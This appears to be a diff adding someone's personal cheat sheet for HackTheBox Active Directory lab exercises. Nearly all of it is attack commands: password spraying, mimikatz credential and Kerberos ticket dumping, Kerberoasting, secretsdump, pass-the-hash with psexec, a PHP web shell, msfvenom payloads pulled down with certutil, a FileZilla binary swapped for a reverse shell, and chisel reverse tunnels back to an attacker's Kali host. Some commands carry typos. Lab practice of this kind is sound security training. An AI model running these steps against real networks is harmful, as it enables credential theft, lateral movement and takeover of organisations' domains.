@@ -1,0 +1,40 @@
+#My exercize HackTheBox ActiveDirectory
+#ADSetI
+nmap -sC -sV -T4 <> -> default password stored in nmap -> ldap enum
+ldapsearch -h <> -bx 'DC=...,DC=...' -> retrieve
+password spray -> cme smb <> -u users.txt -p 'default pass' -> ssh
+#PE
+mimikatz sekurlsa::logonpassword -> hashcat <rockyuou>
+rdp -> hardcoded password -> crackmap smb -> PSExec <dom>/<user>:<pass>@ip
+evil-winrm -i <ip> -u <user> -p <pass>
+#ADSetII
+RoxyFileman1.4.5 unresticted upload -> https://packetstormsecurity.com/files/166585/Roxy-File-Manager-1.4.5-PHP-File-Upload-Restriction-Bypass.html
+ChangeFirewallRules ->  New-NetFirewallRule -Protocol TCP -LocalPort 1080 -Direction Inbound -
+Action Allow -DisplayName SOCK
+Perform pivoting -> proxychains autorecon <ip> <ip>
+impacket-secretdump <domain>/<user>@<ip>
+login to rdp with xfreerdp
+enumerate spn with impacket-GetUserSPN
+Add-Type –AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList '<spn>/<host>:<port>'
+mimikatz.exe "kerberos::list /export"
+tgsrepcrack <rockyou> ticket.kirbi -> crack -> remote logon
+mimikatz sekurlsa::logonpasswords -> hashcat
+#ADSetIII
+Arbitrary File Upload -> ploads/shell.php?cmd=<path> -> msfvenom -f exe -> certutil ->shell
+Winpeas/Seatbelt -> FileZilla vulnerable 
+1 . Copy the Revershell to C:\xampp\filezillaftp\rev_shell.exe
+2. Rename the default binary file using command ren FileZillaServer.exe FileZilla.tmp
+3. Rename our revershell to original filezilla binary name ren rev_shell.exe FileZillaServer.exe
+4. Restart the Binary shutdown -r -t 0
+---
+mimikatz lsadump::sam -> PtH -> psecec <administrator>@<ip> -hashes :myhash
+#ADSetPRO
+upload bypass -> https://book.hacktricks.xyz/pentesting-web/file-upload
+upload Rubeus -> get TGT ticket https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+hashcat <rockyou> 
+psexec/smbexec through Tunnel or RDP -> flag
+msfvenom -f exe -> mimikatz securlsa::logonpasswords, sekurlsa:wdigest -> tunnel chisel/socat -> get administrator desktop
+
+#NB On Kali run ./clisel server -p <port> --reverse
+#On box you want to proxy through run ./chisel client <ip>:<port> R:socks
+
